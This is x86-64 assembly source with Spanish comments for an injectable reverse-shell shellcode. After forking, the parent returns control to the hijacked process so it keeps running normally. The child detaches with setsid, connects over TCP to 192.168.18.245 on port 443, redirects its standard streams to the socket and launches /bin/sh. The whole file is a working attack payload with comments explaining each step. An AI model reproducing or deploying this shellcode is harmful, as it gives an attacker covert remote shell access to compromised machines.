
section .text
global _start
_start:


    ; FORK
    mov rax, 57
    syscall

    cmp rax, 0           ; si rax==0 se trata del hijo
    jz .child            

                            ; r11 porque es un registro clobbered (destruido por las syscalls)
                                ; por tanto, no se está modificando un registro funcional del proceso tracee
    lea r11, [rel _start] ; r11 = dirección de _start = mmap_base = RIP inicial del shellcode


                            ; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar después

    ; Proceso Padre
    mov r14, [r11+4088] ; Obtiene dirección de retorno
    jmp r14             ; Salta a la dirección de retorno sobreescribiendo el registro RIP


.child


    ; SETSID
    mov rax, 112
    syscall


    ; SOCKET
    mov rax, 41
    mov rdi, 2 ;IPV4
    mov rsi, 1 ;TCP
    xor rdx, rdx ; Default
    syscall

    ; Store socket FD
    mov r8, rax

    ; CONNECT
    mov rax, 42
    mov rdi, r8
                    ;   Stack        Low  <----------- High
    ; Entrada esperada: 02 00 01 BB C0 A8 12 F5 00 00 00 00 00 00 00 00   
    ;                   └──┘  └──┘  └────────┘  └──────────────────────┘
    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)
    ;                   fam   port  IP          padding

    ; Mapeado de los campos de sockaddr_in:
                        ; Bytes 0-1:   02 00           → sin_family (AF_INET = 2)
                        ; Bytes 2-3:   01 BB           → sin_port (443)
                        ; Bytes 4-7:   C0 A8 12 F5     → sin_addr (192.168.18.245)
                        ; Bytes 8-15:  00 00 00 00...  → sin_zero (padding)
    xor r9,r9 ; 0
    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)
    mov r10, 0xF512A8C0BB010002    
    push r10 ; sin_family + sin_port + sin_addr (8 bytes)
    mov rsi, rsp ; direccion del tope de la pila
    mov rdx, 16 ;IPV4 (espera 16 bytes)
    syscall


    xor rsi,rsi
.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket
    ;DUP2
    mov rax, 33
    mov rdi, r8
    syscall 
    inc rsi
    cmp rsi, 3
    jl .dup2

    ; EXEXCVE
    mov rax, 59

    push 0                       ; null terminator de /bin/sh -> /bin/sh\0
    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian
    push r12                     ; string /bin/sh
    mov rdi, rsp

    push 0                       ; argv = {NULL}
    mov rsi, rsp

    push 0                       ; envp = {NULL}
    mov rdx, rsp

    syscall 

.done:
    ; EXIT
    mov rax, 60                    ; syscall: exit
    xor rdi, rdi                   ; exit code = 0 (éxito)
    syscall                        